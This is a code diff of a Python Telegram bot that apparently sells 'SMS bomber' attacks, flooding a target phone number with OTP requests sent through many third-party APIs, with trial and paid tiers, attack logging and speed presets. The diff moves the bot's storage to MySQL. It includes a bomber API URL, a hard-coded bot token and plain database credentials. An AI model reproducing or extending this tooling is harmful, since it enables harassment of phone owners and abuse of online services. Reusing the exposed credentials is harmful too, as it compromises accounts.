@@ -3,19 +3,28 @@ import aiohttp
 import json
 import re
 import time
+import pymysql
+import pymysql.cursors
 from datetime import datetime, timedelta
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 import logging
-from pathlib import Path
 from typing import Optional
 import html
 
-# Import MySQL config
-from mysql_config import BotDB
-
 # Bot configuration
 BOT_TOKEN = "8448343135:AAEP7CjK4cI4SoeR16ytrG2ytjkncpkTKPw"
+
+# MySQL Configuration
+MYSQL_CONFIG = {
+    'host': 'localhost',
+    'port': 3306,
+    'database': 'vipxoffic_vip',
+    'user': 'vipxoffic_vip',
+    'password': 'vipxoffic_vip',
+    'charset': 'utf8mb4',
+    'cursorclass': pymysql.cursors.DictCursor
+}
 
 # Enable logging
 logging.basicConfig(
@@ -24,9 +33,80 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# =============== DATABASE SETUP ===============
-# Initialize BotDB for this bot
-db = BotDB('bomberbot')
+# =============== DATABASE FUNCTIONS ===============
+
+def get_db_connection():
+    """Get MySQL database connection"""
+    try:
+        connection = pymysql.connect(**MYSQL_CONFIG)
+        return connection
+    except pymysql.Error as e:
+        logger.error(f"MySQL Connection Error: {e}")
+        return None
+
+def init_database():
+    """Initialize MySQL database tables"""
+    connection = get_db_connection()
+    if not connection:
+        print("❌ Failed to connect to MySQL database")
+        return
+    
+    try:
+        cursor = connection.cursor()
+        
+        # Create authorized_users table
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS authorized_users (
+                user_id BIGINT PRIMARY KEY,
+                username VARCHAR(255),
+                display_name VARCHAR(255),
+                added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                added_by BIGINT,
+                trial_used_count INT DEFAULT 0,
+                last_trial_used TIMESTAMP NULL,
+                is_trial_blocked BOOLEAN DEFAULT 0,
+                is_paid_user BOOLEAN DEFAULT 0
+            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
+        ''')
+        
+        # Create attack_logs table
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS attack_logs (
+                id INT AUTO_INCREMENT PRIMARY KEY,
+                user_id BIGINT,
+                target_number VARCHAR(20),
+                duration_seconds INT,
+                requests_sent INT,
+                requests_success INT,
+                requests_failed INT,
+                start_time TIMESTAMP,
+                end_time TIMESTAMP,
+                status VARCHAR(50),
+                is_trial_attack BOOLEAN DEFAULT 0,
+                INDEX idx_user_id (user_id),
+                INDEX idx_start_time (start_time)
+            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
+        ''')
+        
+        # Create user_settings table
+        cursor.execute('''
+            CREATE TABLE IF NOT EXISTS user_settings (
+                user_id BIGINT PRIMARY KEY,
+                speed_level INT DEFAULT 3,
+                max_concurrent INT DEFAULT 10,
+                delay_between_requests FLOAT DEFAULT 0.1,
+                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
+            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4
+        ''')
+        
+        connection.commit()
+        print("✅ MySQL Database initialized successfully")
+        
+    except pymysql.Error as e:
+        print(f"❌ Database initialization error: {e}")
+    finally:
+        cursor.close()
+        connection.close()
 
 def clean_text(text: str) -> str:
     """Clean special characters and emojis from text"""
@@ -41,205 +121,241 @@ def clean_text(text: str) -> str:
 
 def add_authorized_user(user_id: int, username: str, display_name: str, added_by: int, is_paid: bool = False):
     """Add user to authorized list with cleaned text"""
-    # Clean the inputs
-    clean_username = clean_text(username)
-    clean_display_name = clean_text(display_name)
+    connection = get_db_connection()
+    if not connection:
+        logger.error("Failed to connect to database")
+        return
     
-    # Get existing user data
-    user = db.get_user(user_id)
-    
-    if user:
-        # Update existing user
-        data = user.get('data', {}) or {}
-        data.update({
-            'display_name': clean_display_name,
-            'added_by': added_by,
-            'username': clean_username
-        })
+    try:
+        cursor = connection.cursor()
+        
+        # Clean the inputs
+        clean_username = clean_text(username)
+        clean_display_name = clean_text(display_name)
         
         if is_paid:
-            data.update({
-                'is_paid_user': True,
-                'trial_used_count': 0,
-                'is_trial_blocked': True
-            })
+            cursor.execute('''
+                INSERT INTO authorized_users 
+                (user_id, username, display_name, added_by, is_paid_user, trial_used_count, is_trial_blocked) 
+                VALUES (%s, %s, %s, %s, %s, %s, %s)
+                ON DUPLICATE KEY UPDATE
+                username = VALUES(username),
+                display_name = VALUES(display_name),
+                added_by = VALUES(added_by),
+                is_paid_user = VALUES(is_paid_user),
+                trial_used_count = VALUES(trial_used_count),
+                is_trial_blocked = VALUES(is_trial_blocked)
+            ''', (user_id, clean_username, clean_display_name, added_by, 1, 0, 1))
+        else:
+            # Check if user exists
+            cursor.execute('SELECT * FROM authorized_users WHERE user_id = %s', (user_id,))
+            existing_user = cursor.fetchone()
+            
+            if not existing_user:
+                # New user - add with trial available
+                cursor.execute('''
+                    INSERT INTO authorized_users 
+                    (user_id, username, display_name, added_by, trial_used_count, is_trial_blocked) 
+                    VALUES (%s, %s, %s, %s, %s, %s)
+                ''', (user_id, clean_username, clean_display_name, added_by, 0, 0))
+            else:
+                # Update existing user
+                cursor.execute('''
+                    UPDATE authorized_users 
+                    SET username = %s, display_name = %s, added_by = %s
+                    WHERE user_id = %s
+                ''', (clean_username, clean_display_name, added_by, user_id))
         
-        db.save_user(
-            user_id=user_id,
-            username=clean_username,
-            first_name=clean_display_name,
-            last_name='',
-            chat_id=user.get('chat_id'),
-            extra_data=data
-        )
-    else:
-        # New user
-        data = {
-            'display_name': clean_display_name,
-            'added_by': added_by,
-            'trial_used_count': 0,
-            'last_trial_used': None,
-            'is_trial_blocked': False,
-            'is_paid_user': True if is_paid else False,
-            'username': clean_username,
-            'attack_logs': []
-        }
+        connection.commit()
         
-        if is_paid:
-            data['is_trial_blocked'] = True
-        
-        db.save_user(
-            user_id=user_id,
-            username=clean_username,
-            first_name=clean_display_name,
-            last_name='',
-            chat_id=None,
-            extra_data=data
-        )
+    except pymysql.Error as e:
+        logger.error(f"Database error in add_authorized_user: {e}")
+    finally:
+        cursor.close()
+        connection.close()
 
 def remove_authorized_user(user_id: int):
     """Remove user from authorized list"""
-    # Since we can't delete easily, we'll mark as removed
-    user = db.get_user(user_id)
-    if user:
-        data = user.get('data', {}) or {}
-        data['is_removed'] = True
-        data['is_paid_user'] = False
-        db.save_user(
-            user_id=user_id,
-            username=user.get('username'),
-            first_name=user.get('first_name'),
-            last_name=user.get('last_name'),
-            chat_id=user.get('chat_id'),
-            extra_data=data
-        )
+    connection = get_db_connection()
+    if not connection:
+        return
+    
+    try:
+        cursor = connection.cursor()
+        cursor.execute('DELETE FROM authorized_users WHERE user_id = %s', (user_id,))
+        cursor.execute('DELETE FROM user_settings WHERE user_id = %s', (user_id,))
+        connection.commit()
+    except pymysql.Error as e:
+        logger.error(f"Database error in remove_authorized_user: {e}")
+    finally:
+        cursor.close()
+        connection.close()
 
 def is_user_authorized(user_id: int) -> bool:
     """Check if user is authorized (paid user)"""
-    user = db.get_user(user_id)
-    if not user:
+    connection = get_db_connection()
+    if not connection:
         return False
-    data = user.get('data', {}) or {}
-    return data.get('is_paid_user', False)
+    
+    try:
+        cursor = connection.cursor()
+        cursor.execute('SELECT is_paid_user FROM authorized_users WHERE user_id = %s', (user_id,))
+        result = cursor.fetchone()
+        return result is not None and result['is_paid_user'] == 1
+    except pymysql.Error as e:
+        logger.error(f"Database error in is_user_authorized: {e}")
+        return False
+    finally:
+        cursor.close()
+        connection.close()
 
 def can_user_use_trial(user_id: int) -> tuple[bool, str]:
-    """Check if user can use trial (once only) - STRICT CHECK"""
-    user = db.get_user(user_id)
+    """Check if user can use trial (once per week) - STRICT CHECK"""
+    connection = get_db_connection()
+    if not connection:
+        return False, "Database connection error"
     
-    # If user doesn't exist, they can use trial once
-    if not user:
-        return True, "First-time user, trial available"
-    
-    data = user.get('data', {}) or {}
-    trial_used_count = data.get('trial_used_count', 0)
-    last_trial_used = data.get('last_trial_used')
-    is_trial_blocked = data.get('is_trial_blocked', False)
-    is_paid_user = data.get('is_paid_user', False)
-    is_removed = data.get('is_removed', False)
-    
-    # Check if user is removed
-    if is_removed:
-        return False, "User account is disabled"
-    
-    # Check if user is paid user
-    if is_paid_user:
-        return False, "Paid users cannot use trial"
-    
-    # Check if trial is blocked
-    if is_trial_blocked:
-        return False, "Trial permanently blocked after first use"
-    
-    # If never used trial
-    if trial_used_count == 0 or not last_trial_used:
-        return True, "First trial available"
-    
-    return False, "Trial already used"
+    try:
+        cursor = connection.cursor()
+        cursor.execute('''
+            SELECT trial_used_count, last_trial_used, is_trial_blocked, is_paid_user 
+            FROM authorized_users WHERE user_id = %s
+        ''', (user_id,))
+        
+        result = cursor.fetchone()
+        
+        # If user doesn't exist, they can use trial once
+        if not result:
+            return True, "First-time user, trial available"
+        
+        trial_used_count = result['trial_used_count']
+        last_trial_used = result['last_trial_used']
+        is_trial_blocked = result['is_trial_blocked']
+        is_paid_user = result['is_paid_user']
+        
+        # Check if user is paid user
+        if is_paid_user:
+            return False, "Paid users cannot use trial"
+        
+        # Check if trial is blocked
+        if is_trial_blocked:
+            return False, "Trial permanently blocked after first use"
+        
+        # If never used trial
+        if trial_used_count == 0 or last_trial_used is None:
+            return True, "First trial available"
+        
+        return False, "Trial already used"
+        
+    except pymysql.Error as e:
+        logger.error(f"Database error in can_user_use_trial: {e}")
+        return False, "Database error"
+    finally:
+        cursor.close()
+        connection.close()
 
 def mark_trial_used(user_id: int):
     """Mark trial as used for user - PERMANENTLY BLOCK after first use"""
-    current_time = datetime.now().isoformat()
+    connection = get_db_connection()
+    if not connection:
+        return
     
-    user = db.get_user(user_id)
-    if user:
-        data = user.get('data', {}) or {}
-        data['trial_used_count'] = data.get('trial_used_count', 0) + 1
-        data['last_trial_used'] = current_time
-        data['is_trial_blocked'] = True
+    try:
+        cursor = connection.cursor()
+        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         
-        db.save_user(
-            user_id=user_id,
-            username=user.get('username'),
-            first_name=user.get('first_name'),
-            last_name=user.get('last_name'),
-            chat_id=user.get('chat_id'),
-            extra_data=data
-        )
-    
-    logger.info(f"Trial marked as used for user {user_id} - PERMANENTLY BLOCKED")
+        cursor.execute('''
+            UPDATE authorized_users 
+            SET trial_used_count = trial_used_count + 1,
+                last_trial_used = %s,
+                is_trial_blocked = 1
+            WHERE user_id = %s
+        ''', (current_time, user_id))
+        
+        connection.commit()
+        logger.info(f"Trial marked as used for user {user_id} - PERMANENTLY BLOCKED")
+        
+    except pymysql.Error as e:
+        logger.error(f"Database error in mark_trial_used: {e}")
+    finally:
+        cursor.close()
+        connection.close()
 
 def block_user_trial(user_id: int):
     """Permanently block trial for user"""
-    user = db.get_user(user_id)
-    if user:
-        data = user.get('data', {}) or {}
-        data['is_trial_blocked'] = True
-        
-        db.save_user(
-            user_id=user_id,
-            username=user.get('username'),
-            first_name=user.get('first_name'),
-            last_name=user.get('last_name'),
-            chat_id=user.get('chat_id'),
-            extra_data=data
-        )
+    connection = get_db_connection()
+    if not connection:
+        return
     
-    logger.info(f"Trial blocked for user {user_id}")
+    try:
+        cursor = connection.cursor()
+        cursor.execute('''
+            UPDATE authorized_users 
+            SET is_trial_blocked = 1
+            WHERE user_id = %s
+        ''', (user_id,))
+        
+        connection.commit()
+        logger.info(f"Trial blocked for user {user_id}")
+        
+    except pymysql.Error as e:
+        logger.error(f"Database error in block_user_trial: {e}")
+    finally:
+        cursor.close()
+        connection.close()
 
 def unblock_user_trial(user_id: int):
     """Unblock trial for user"""
-    user = db.get_user(user_id)
-    if user:
-        data = user.get('data', {}) or {}
-        data['is_trial_blocked'] = False
-        data['trial_used_count'] = 0
-        data['last_trial_used'] = None
-        
-        db.save_user(
-            user_id=user_id,
-            username=user.get('username'),
-            first_name=user.get('first_name'),
-            last_name=user.get('last_name'),
-            chat_id=user.get('chat_id'),
-            extra_data=data
-        )
+    connection = get_db_connection()
+    if not connection:
+        return
     
-    logger.info(f"Trial unblocked for user {user_id}")
+    try:
+        cursor = connection.cursor()
+        cursor.execute('''
+            UPDATE authorized_users 
+            SET is_trial_blocked = 0
+            WHERE user_id = %s
+        ''', (user_id,))
+        
+        connection.commit()
+        logger.info(f"Trial unblocked for user {user_id}")
+        
+    except pymysql.Error as e:
+        logger.error(f"Database error in unblock_user_trial: {e}")
+    finally:
+        cursor.close()
+        connection.close()
 
 def reset_user_trial(user_id: int):
     """Reset user's trial (admin only)"""
-    user = db.get_user(user_id)
-    if user:
-        data = user.get('data', {}) or {}
-        data['trial_used_count'] = 0
-        data['last_trial_used'] = None
-        data['is_trial_blocked'] = False
-        
-        db.save_user(
-            user_id=user_id,
-            username=user.get('username'),
-            first_name=user.get('first_name'),
-            last_name=user.get('last_name'),
-            chat_id=user.get('chat_id'),
-            extra_data=data
-        )
+    connection = get_db_connection()
+    if not connection:
+        return
     
-    logger.info(f"Trial reset for user {user_id}")
+    try:
+        cursor = connection.cursor()
+        cursor.execute('''
+            UPDATE authorized_users 
+            SET trial_used_count = 0,
+                last_trial_used = NULL,
+                is_trial_blocked = 0
+            WHERE user_id = %s
+        ''', (user_id,))
+        
+        connection.commit()
+        logger.info(f"Trial reset for user {user_id}")
+        
+    except pymysql.Error as e:
+        logger.error(f"Database error in reset_user_trial: {e}")
+    finally:
+        cursor.close()
+        connection.close()
 
 def get_user_trial_info(user_id: int) -> dict:
     """Get user's trial information"""
-    user = db.get_user(user_id)
-    
-    if not user:
+    connection = get_db_connection()
+    if not connection:
         return {
             'trial_used_count': 0,
             'last_trial_used': None,
@@ -250,134 +366,186 @@ def get_user_trial_info(user_id: int) -> dict:
             'exists': False
         }
     
-    data = user.get('data', {}) or {}
-    trial_used_count = data.get('trial_used_count', 0)
-    last_trial_used = data.get('last_trial_used')
-    is_trial_blocked = data.get('is_trial_blocked', False)
-    is_paid_user = data.get('is_paid_user', False)
-    display_name = data.get('display_name', '')
-    is_removed = data.get('is_removed', False)
-    
-    # Check if trial is available
-    trial_available = False
-    if not is_trial_blocked and not is_paid_user and not is_removed:
-        if trial_used_count == 0 or not last_trial_used:
-            trial_available = True
-    
-    return {
-        'trial_used_count': trial_used_count,
-        'last_trial_used': last_trial_used,
-        'is_trial_blocked': bool(is_trial_blocked),
-        'is_paid_user': bool(is_paid_user),
-        'display_name': display_name or '',
-        'trial_available': trial_available,
-        'exists': True,
-        'is_removed': is_removed
-    }
+    try:
+        cursor = connection.cursor()
+        cursor.execute('''
+            SELECT trial_used_count, last_trial_used, is_trial_blocked, is_paid_user, display_name
+            FROM authorized_users WHERE user_id = %s
+        ''', (user_id,))
+        
+        result = cursor.fetchone()
+        
+        if not result:
+            return {
+                'trial_used_count': 0,
+                'last_trial_used': None,
+                'is_trial_blocked': False,
+                'is_paid_user': False,
+                'display_name': '',
+                'trial_available': True,
+                'exists': False
+            }
+        
+        trial_used_count = result['trial_used_count']
+        last_trial_used = result['last_trial_used']
+        is_trial_blocked = result['is_trial_blocked']
+        is_paid_user = result['is_paid_user']
+        display_name = result['display_name']
+        
+        # Check if trial is available
+        trial_available = False
+        if not is_trial_blocked and not is_paid_user:
+            if trial_used_count == 0 or last_trial_used is None:
+                trial_available = True
+        
+        return {
+            'trial_used_count': trial_used_count,
+            'last_trial_used': str(last_trial_used) if last_trial_used else None,
+            'is_trial_blocked': bool(is_trial_blocked),
+            'is_paid_user': bool(is_paid_user),
+            'display_name': display_name or '',
+            'trial_available': trial_available,
+            'exists': True
+        }
+        
+    except pymysql.Error as e:
+        logger.error(f"Database error in get_user_trial_info: {e}")
+        return {
+            'trial_used_count': 0,
+            'last_trial_used': None,
+            'is_trial_blocked': False,
+            'is_paid_user': False,
+            'display_name': '',
+            'trial_available': False,
+            'exists': False
+        }
+    finally:
+        cursor.close()
+        connection.close()
 
 def get_all_authorized_users():
     """Get all authorized users"""
-    users = db.get_all_users()
+    connection = get_db_connection()
+    if not connection:
+        return []
     
-    # Format users similar to old SQLite format
-    formatted_users = []
-    for user in users:
-        data = user.get('data', {}) or {}
-        is_removed = data.get('is_removed', False)
-        if not is_removed:  # Only show non-removed users
-            formatted_users.append((
-                user['user_id'],
-                user.get('username', ''),
-                data.get('display_name', ''),
-                user.get('created_at', ''),
-                data.get('trial_used_count', 0),
-                data.get('last_trial_used'),
-                data.get('is_trial_blocked', False),
-                data.get('is_paid_user', False)
-            ))
-    
-    return formatted_users
+    try:
+        cursor = connection.cursor()
+        cursor.execute('''
+            SELECT user_id, username, display_name, added_at, trial_used_count, 
+                   last_trial_used, is_trial_blocked, is_paid_user 
+            FROM authorized_users 
+            ORDER BY added_at DESC
+        ''')
+        users = cursor.fetchall()
+        return users
+        
+    except pymysql.Error as e:
+        logger.error(f"Database error in get_all_authorized_users: {e}")
+        return []
+    finally:
+        cursor.close()
+        connection.close()
 
 def get_user_speed_settings(user_id: int):
     """Get user's speed settings"""
-    user = db.get_user(user_id)
-    
-    default_settings = {
-        'speed_level': 3,
-        'max_concurrent': 10,
-        'delay': 0.1
-    }
-    
-    if not user:
-        return default_settings
-    
-    data = user.get('data', {}) or {}
-    speed_settings = data.get('speed_settings', {})
-    
-    if speed_settings:
+    connection = get_db_connection()
+    if not connection:
         return {
-            'speed_level': speed_settings.get('speed_level', 3),
-            'max_concurrent': speed_settings.get('max_concurrent', 10),
-            'delay': speed_settings.get('delay', 0.1)
+            'speed_level': 3,
+            'max_concurrent': 10,
+            'delay': 0.1
         }
-    else:
-        return default_settings
+    
+    try:
+        cursor = connection.cursor()
+        cursor.execute('''
+            SELECT speed_level, max_concurrent, delay_between_requests 
+            FROM user_settings WHERE user_id = %s
+        ''', (user_id,))
+        result = cursor.fetchone()
+        
+        if result:
+            return {
+                'speed_level': result['speed_level'],
+                'max_concurrent': result['max_concurrent'],
+                'delay': result['delay_between_requests']
+            }
+        else:
+            # Default settings
+            default_settings = {
+                'speed_level': 3,
+                'max_concurrent': 10,
+                'delay': 0.1
+            }
+            set_user_speed_settings(user_id, default_settings)
+            return default_settings
+            
+    except pymysql.Error as e:
+        logger.error(f"Database error in get_user_speed_settings: {e}")
+        return {
+            'speed_level': 3,
+            'max_concurrent': 10,
+            'delay': 0.1
+        }
+    finally:
+        cursor.close()
+        connection.close()
 
 def set_user_speed_settings(user_id: int, settings: dict):
     """Set user's speed settings"""
-    user = db.get_user(user_id)
+    connection = get_db_connection()
+    if not connection:
+        return
     
-    if user:
-        data = user.get('data', {}) or {}
-        data['speed_settings'] = settings
+    try:
+        cursor = connection.cursor()
+        cursor.execute('''
+            INSERT INTO user_settings 
+            (user_id, speed_level, max_concurrent, delay_between_requests, updated_at)
+            VALUES (%s, %s, %s, %s, CURRENT_TIMESTAMP)
+            ON DUPLICATE KEY UPDATE
+            speed_level = VALUES(speed_level),
+            max_concurrent = VALUES(max_concurrent),
+            delay_between_requests = VALUES(delay_between_requests),
+            updated_at = CURRENT_TIMESTAMP
+        ''', (user_id, settings['speed_level'], settings['max_concurrent'], settings['delay']))
         
-        db.save_user(
-            user_id=user_id,
-            username=user.get('username'),
-            first_name=user.get('first_name'),
-            last_name=user.get('last_name'),
-            chat_id=user.get('chat_id'),
-            extra_data=data
-        )
+        connection.commit()
+        
+    except pymysql.Error as e:
+        logger.error(f"Database error in set_user_speed_settings: {e}")
+    finally:
+        cursor.close()
+        connection.close()
 
 def log_attack(user_id: int, target_number: str, duration: int, requests_sent: int, 
                success: int, failed: int, start_time: datetime, end_time: datetime, 
                status: str, is_trial_attack: bool = False):
     """Log attack details to database"""
-    user = db.get_user(user_id)
+    connection = get_db_connection()
+    if not connection:
+        return
     
-    if user:
-        data = user.get('data', {}) or {}
+    try:
+        cursor = connection.cursor()
+        cursor.execute('''
+            INSERT INTO attack_logs 
+            (user_id, target_number, duration_seconds, requests_sent, requests_success, 
+             requests_failed, start_time, end_time, status, is_trial_attack)
+            VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
+        ''', (user_id, target_number, duration, requests_sent, success, failed, 
+              start_time.strftime('%Y-%m-%d %H:%M:%S'), 
+              end_time.strftime('%Y-%m-%d %H:%M:%S'), 
+              status, is_trial_attack))
         
-        # Initialize attack logs if not exists
-        if 'attack_logs' not in data:
-            data['attack_logs'] = []
+        connection.commit()
         
-        # Add new attack log
-        data['attack_logs'].append({
-            'target_number': target_number,
-            'duration_seconds': duration,
-            'requests_sent': requests_sent,
-            'requests_success': success,
-            'requests_failed': failed,
-            'start_time': start_time.isoformat(),
-            'end_time': end_time.isoformat(),
-            'status': status,
-            'is_trial_attack': is_trial_attack
-        })
-        
-        # Keep only last 50 logs to prevent data bloat
-        if len(data['attack_logs']) > 50:
-            data['attack_logs'] = data['attack_logs'][-50:]
-        
-        db.save_user(
-            user_id=user_id,
-            username=user.get('username'),
-            first_name=user.get('first_name'),
-            last_name=user.get('last_name'),
-            chat_id=user.get('chat_id'),
-            extra_data=data
-        )
+    except pymysql.Error as e:
+        logger.error(f"Database error in log_attack: {e}")
+    finally:
+        cursor.close()
+        connection.close()
 
 # Speed level presets
 SPEED_PRESETS = {
@@ -418,10 +586,13 @@ SPEED_PRESETS = {
     }
 }
 
+# Initialize database
+init_database()
+
 # =============== ALL APIs START ===============
 APIS = [
     # ============ ORIGINAL API ============
-    {
+        {
         "url": "https://splexxo1-2api.vercel.app/bomb?phone={phone}&key=SPLEXXO",
         "method": "GET",
         "headers": {},
@@ -2056,7 +2227,7 @@ APIS = [
         "data": lambda phone: f"mobile={phone}&current_page=login&is_existing_customer=2",
         "count": 200
     }
-    # Add your other APIs here...
+
 ]
 # =============== ALL APIs END ===============
 
@@ -2280,7 +2451,7 @@ Example: /trial 9876543210
 ├─ ❌ After use: PERMANENTLY BLOCKED
 ├─ 🔒 No further trial access
 ├─ 💰 Contact admin for paid access
-└─ 👑 Admin: VIP_X_OFFICIAL
+└─ 👑 Admin: @VIP_X_OFFICIAL
 """
         )
         return
@@ -2512,7 +2683,7 @@ Limits:
             await update.message.reply_text("❌ Bsdk aur kitne karega")
             return
     except ValueError:
-        await update.message.reply_text("❌ Invalid duration! Must be a number.")
+        await update.message.reply_text("❌ Invalid duration! Must be a number (10-300).")
         return
     
     # Check if APIs are configured
@@ -2731,7 +2902,7 @@ async def run_flash_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, p
     
     # Attack finished
     attack_end = datetime.now()
-    elapsed = (attack_end - attack_start).seconds if attack_start else duration
+    elapsed = (attack_end - attack_start).seconds
     
     # Update final status
     await update_flash_final_status(context, chat_id, message_id, phone, elapsed, speed_settings, is_trial)
@@ -2744,7 +2915,7 @@ async def run_flash_attack(update: Update, context: ContextTypes.DEFAULT_TYPE, p
         requests_sent=context.user_data.get('total_requests', 0),
         success=context.user_data.get('successful_requests', 0),
         failed=context.user_data.get('failed_requests', 0),
-        start_time=attack_start or datetime.now(),
+        start_time=attack_start,
         end_time=attack_end,
         status="COMPLETED" if context.user_data.get('attacking', False) else "STOPPED",
         is_trial_attack=is_trial
@@ -2862,7 +3033,7 @@ async def update_flash_final_status(context: ContextTypes.DEFAULT_TYPE, chat_id:
         
         final_message += f"""
 🕐 TIME INFO:
-├─ STARTED: {context.user_data['attack_start'].strftime('%H:%M:%S') if context.user_data.get('attack_start') else 'N/A'}
+├─ STARTED: {context.user_data['attack_start'].strftime('%H:%M:%S')}
 └─ ENDED: {datetime.now().strftime('%H:%M:%S')}
 """
         
@@ -3380,29 +3551,24 @@ Only admins can use this command.
     message += "║          📋 AUTHORIZED USERS          ║\n"
     message += "╚════════════════════════════════════════╝\n\n"
     
-    for idx, (user_id, username, display_name, added_at, trial_count, last_trial, trial_blocked, is_paid) in enumerate(users, 1):
-        status = "💰 PAID USER" if is_paid else "🎁 TRIAL USER"
-        trial_status = "✅ ACTIVE" if not trial_blocked else "❌ PERMANENTLY BLOCKED"
+    for idx, user in enumerate(users, 1):
+        status = "💰 PAID USER" if user['is_paid_user'] else "🎁 TRIAL USER"
+        trial_status = "✅ ACTIVE" if not user['is_trial_blocked'] else "❌ PERMANENTLY BLOCKED"
         
         message += f"┌─👤 USER #{idx}\n"
         message += f"│\n"
-        message += f"├─ ID: {user_id}\n"
-        message += f"├─ Username: {username or 'N/A'}\n"
-        message += f"├─ Display Name: {display_name or 'N/A'}\n"
+        message += f"├─ ID: {user['user_id']}\n"
+        message += f"├─ Username: {user['username'] or 'N/A'}\n"
+        message += f"├─ Display Name: {user['display_name'] or 'N/A'}\n"
         message += f"├─ Status: {status}\n"
-        message += f"├─ Trials Used: {trial_count}\n"
-        message += f"├─ Last Trial: {last_trial.split('T')[0] if last_trial else 'Never'}\n"
+        message += f"├─ Trials Used: {user['trial_used_count']}\n"
+        message += f"├─ Last Trial: {str(user['last_trial_used']).split(' ')[0] if user['last_trial_used'] else 'Never'}\n"
         message += f"├─ Trial Status: {trial_status}\n"
-        message += f"└─ Added: {added_at}\n\n"
+        message += f"└─ Added: {user['added_at']}\n\n"
     
     message += f"📊 Total Users: {len(users)}"
     
-    # Split message if too long
-    if len(message) > 4000:
-        for i in range(0, len(message), 3500):
-            await update.message.reply_text(message[i:i+3500])
-    else:
-        await update.message.reply_text(message)
+    await update.message.reply_text(message)
 
 async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Show user statistics"""
@@ -3571,10 +3737,10 @@ Only admins can use this command.
         f"✅ Sent: 0 | ❌ Failed: 0"
     )
     
-    for user_id, username, _, _, _, _, _, _ in users:
+    for user in users:
         try:
             await context.bot.send_message(
-                chat_id=user_id,
+                chat_id=user['user_id'],
                 text=f"""
 ╔════════════════════════════════════════╗
 ║          📢 BROADCAST MESSAGE          ║
@@ -3591,7 +3757,7 @@ Only admins can use this command.
             sent += 1
         except Exception as e:
             failed += 1
-            logger.error(f"Failed to send to {user_id}: {e}")
+            logger.error(f"Failed to send to {user['user_id']}: {e}")
         
         # Update status every 5 sends
         if (sent + failed) % 5 == 0:
@@ -3660,7 +3826,7 @@ def main():
 ├─🤖 Bot Token: Loaded
 ├─📊 Total APIs: {TOTAL_APIS}
 ├─⚡ Attack Mode: FLASH ATTACK
-├─💾 Database: MySQL (cPanel)
+├─🗄️ Database: MySQL (cPanel)
 ├─👑 Admin Users: {len(ADMIN_USER_IDS)}
 └─🔥 Status: Starting...
 
@@ -3687,15 +3853,15 @@ def main():
 ├─⚡ /speed - Set speed (5=Flash Mode) - PAID ONLY
 ├─📊 /stats - View statistics
 ├─🛑 /stop - Stop attack
-├─🔄 /resettrial - Reset user trial (Admin)
-├─🚫 /blocktrial - Block user trial (Admin)
-├─✅ /unblocktrial - Unblock user trial (Admin)
+├—🔄 /resettrial - Reset user trial (Admin)
+├—🚫 /blocktrial - Block user trial (Admin)
+├—✅ /unblocktrial - Unblock user trial (Admin)
 ├─➕ /add - Add paid user (Admin)
 ├─➖ /remove - Remove user (Admin)
 ├─📋 /users - List users (Admin)
 └─📢 /broadcast - Broadcast (Admin)
 
-🔥 BOT IS NOW RUNNING IN FLASH MODE WITH MySQL!
+🔥 BOT IS NOW RUNNING IN FLASH MODE!
 Press Ctrl+C to stop
 """)
     
